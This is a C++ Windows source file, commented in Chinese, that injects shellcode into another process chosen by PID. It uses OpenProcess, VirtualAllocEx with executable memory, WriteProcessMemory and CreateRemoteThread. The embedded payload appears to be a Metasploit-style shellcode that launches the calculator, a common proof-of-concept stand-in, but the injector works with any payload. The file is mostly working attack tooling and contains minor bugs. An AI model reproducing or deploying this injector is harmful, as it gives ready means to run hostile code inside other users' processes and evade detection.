#include <Windows.h>
#include <iostream>
#include <vector>
#include <TlHelp32.h> 
#include <string> 

//弹出计算器的shellcode
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



bool injectShellcode(DWORD Target) {

    //获取目标进程句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,Target);
    if (hProcess == nullptr) {
        std::cerr << "[!] Open Process failed: "<<GetLastError() << std::endl;
        return FALSE;
      }
    //在目标进程内创建内存空间
    LPVOID remoteBuffer = VirtualAllocEx(hProcess,NULL,sizeof(buf), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == nullptr) {
        std::cerr << "[!] VirtualAllocEx failed：" << GetLastError() << std::endl;
        return FALSE;
    }

    //往内存内写入shellcode，写入失败返回0，成功返回非0
    BOOL writeCodeResult = WriteProcessMemory(hProcess,remoteBuffer,buf,sizeof(buf),NULL);
    if (!writeCodeResult) {
        std::cerr << "[!] WriteProcessMemory failed:" << GetLastError() << std::endl;
        return FALSE;
    }
    
    //在目标进程内创建线程并执行shellcode
    HANDLE hThread = CreateRemoteThread(hProcess,NULL,0, (LPTHREAD_START_ROUTINE)remoteBuffer,NULL,0,NULL);
    if (hThread == NULL) {
        std::cerr << "[!] CreateRemoteThread failed: " << GetLastError << std::endl;
        return FALSE;
    }

    // 获取线程 ID
    DWORD threadId = GetThreadId(hThread);
    std::cout << "Thread ID" << threadId << std::endl;

    // 等待远程线程执行完成 (可选，取决于Shellcode行为)
    // 对于弹出消息框的Shellcode，通常不需要等待，因为它会阻塞目标进程。
    // 对于其他Shellcode，可能需要等待其完成或超时。
    // WaitForSingleObject(hRemoteThread, INFINITE); 

    // 释放远程进程中分配的内存，虽然Shellcode执行后可能已不再需要，
    // 但良好的实践是进行清理。
    // 注意：如果Shellcode需要长时间运行或修改内存，则不应立即释放。
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hThread);

    return TRUE;
}

int main(int argc,char* argv[])
{
    if (argc != 2) {
        std::cout << "Uasge: "<<argv[0]<<" <PID>" << std::endl;
        return 1;
    }
    DWORD TargetPID = static_cast<DWORD>(std::stoul(argv[1]));
    bool injectResult = injectShellcode(TargetPID);
    if (injectResult) {
        std::cout << "Inject Success!" << std::endl;
    }
    else {
        std::cout << "Inject Failed!" << std::endl;
    }
    return 0;
}
